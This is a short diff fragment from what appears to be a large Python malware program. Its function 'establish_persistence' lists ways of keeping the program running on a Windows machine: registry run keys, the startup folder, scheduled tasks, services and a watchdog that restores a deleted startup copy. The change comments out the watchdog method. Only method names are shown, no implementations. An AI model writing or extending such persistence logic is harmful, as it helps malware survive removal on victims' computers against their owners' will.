@@ -3032,7 +3032,7 @@ def establish_persistence():
     persistence_methods = [
         registry_run_key_persistence,
         startup_folder_persistence,
-        startup_folder_watchdog_persistence,  # NEW: Auto-restore startup copy
+        # startup_folder_watchdog_persistence,  # DISABLED: Auto-restore startup copy
         scheduled_task_persistence,
         service_persistence,
         # Advanced persistence methods
